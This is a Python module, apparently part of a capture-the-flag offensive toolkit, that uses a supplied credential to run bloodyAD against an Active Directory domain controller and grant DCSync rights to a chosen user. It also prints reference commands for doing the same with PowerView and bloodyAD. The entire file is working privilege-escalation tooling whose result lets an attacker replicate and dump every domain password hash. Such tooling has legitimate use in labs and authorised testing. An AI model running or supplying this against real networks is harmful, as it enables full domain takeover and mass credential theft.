from core.paths import get_chain_artifacts_dir
from datetime import datetime
import subprocess


def run(data, cred, args):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    P = '\033[95m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    #
    # REFERENCE
    #

    if getattr(args, "reference", False):

        print(
            f"\n{B}AD DCSYNC ADD{W}\n"
        )

        print(
            f"{B}Windows (PowerView){W}\n"
        )

        print(
            f"{Y}Add-ObjectACL "
            f"-PrincipalIdentity "
            f"{P}<USER>{Y} "
            f"-Rights DCSync{W}"
        )

        print()

        print(
            f"{B}Linux (bloodyAD){W}\n"
        )

        print(
            f"{Y}bloodyAD "
            f"add dcsync "
            f"{P}<USER>{W}"
        )

        print()

        return data

    #
    # CREDS
    #

    if not cred:

        print(
            f"\n{R}[!] {W}{BOLD}NO CREDENTIAL SELECTED{W}\n"
        )

        return data

    #
    # ARGS
    #

    if not getattr(args, "extra", None):

        print(
            f"\n{R}[!] {W}Missing username\n"
        )

        print(
            f"{B}Usage:{W} "
            f"{Y}ctf ad.dcsync-add USER{W}\n"
        )

        return data

    username = args.extra[0]

    #
    # TARGET
    #

    target = data.get("ip")
    domain = data.get("domain")

    current_user = cred["user"]
    current_secret = cred["secret"]

    if cred["type"] != "password":

        print(
            f"\n{R}[!] {W}bloodyAD requires a password credential\n"
        )

        return data

    #
    # ARTIFACTS
    #

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "ad"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"dcsync_add_{timestamp}.log"
    )

    #
    # COMMAND
    #

    cmd = [
        "bloodyAD",
        "--host",
        target,
        "-d",
        domain,
        "-u",
        current_user,
        "-p",
        current_secret,
        "add",
        "dcsync",
        username
    ]

    #
    # HUD
    #

    print(
        f"\n{B}┌── {BOLD}MODULE: AD DCSYNC ADD{W}{B} ─────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Domain:{W} "
        f"{C}{domain:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}DC:{W}     "
        f"{C}{target:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}User:{W}   "
        f"{C}{username:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└─────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{B}[*]{W} Running\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    #
    # EXECUTE
    #

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    logfile.write_text(
        result.stdout +
        result.stderr
    )

    #
    # OUTPUT
    #

    if result.stdout:

        print(
            result.stdout
        )

    if result.stderr:

        print(
            result.stderr
        )

    if result.returncode == 0:

        print(
            f"\n{G}[+] {W}DCSync rights granted"
        )

    else:

        print(
            f"\n{R}[-] {W}Failed"
        )

    print(
        f"{B}  └── {C}{logfile}{W}\n"
    )

    return data
